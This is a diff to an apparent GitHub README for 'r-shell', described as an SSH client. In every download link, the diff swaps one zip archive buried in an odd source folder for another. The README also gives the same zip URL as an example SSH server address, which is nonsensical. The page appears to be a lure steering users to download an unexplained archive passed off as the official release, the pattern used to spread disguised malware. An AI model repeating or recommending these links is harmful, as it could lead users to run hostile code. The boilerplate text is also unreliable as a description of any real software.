@@ -1,7 +1,7 @@
 # 🚀 r-shell - Your Easy-to-Use SSH Client
 
 ## 🔗 Download the Latest Version
-[![Download r-shell](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip)](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip)
+[![Download r-shell](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip)](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip)
 
 ## 🖥️ Introduction
 Welcome to r-shell, a modern SSH client that simplifies your remote server management. Whether you want to connect securely to a server or manage multiple sessions, r-shell has you covered. Built with Tauri, React, and Rust, this application offers a user-friendly interface and smart features.
@@ -10,7 +10,7 @@ Welcome to r-shell, a modern SSH client that simplifies your remote server manag
 To get started with r-shell, follow these steps:
 
 ### 1. 🖥️ Download the Software
-Visit the [Releases page](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip) to download the latest version of r-shell. You will find files suitable for your operating system. Download the correct file for your system.
+Visit the [Releases page](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip) to download the latest version of r-shell. You will find files suitable for your operating system. Download the correct file for your system.
 
 ### 2. ⬇️ Install r-shell
 Once the download completes, locate the downloaded file in your system’s downloads folder:
@@ -23,7 +23,7 @@ Once the download completes, locate the downloaded file in your system’s downl
 After installing, open r-shell. Here’s how to set up your first SSH session:
 
 1. Click on the “New Session” button. 
-2. Enter the server address (e.g., `https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip`).
+2. Enter the server address (e.g., `https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip`).
 3. Provide your username. 
 4. Choose the authentication method (password or key).
 5. Click “Connect” to start your session.
@@ -37,7 +37,7 @@ r-shell offers various features to enhance your experience:
 - **AI-Powered Suggestions**: Get intelligent coding assistance while working on your projects.
 
 ## 📥 Download & Install
-For all users, visit the [Releases page](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip) again to ensure you have the latest version. Follow the installation steps based on your operating system.
+For all users, visit the [Releases page](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip) again to ensure you have the latest version. Follow the installation steps based on your operating system.
 
 ## 🔒 System Requirements
 Make sure you meet the following requirements:
@@ -66,4 +66,4 @@ Stay tuned for updates. We continually improve r-shell based on user feedback. W
 ## 🔗 Stay Connected
 To keep up with the latest news, follow our official GitHub page and subscribe to updates.
 
-[![Download r-shell](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip)](https://raw.githubusercontent.com/modifiable-japaneseiris792/r-shell/main/src-tauri/capabilities/r-shell_1.7.zip)
+[![Download r-shell](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip)](https://github.com/modifiable-japaneseiris792/r-shell/raw/refs/heads/main/src/components/terminal/shell-r-1.9.zip)
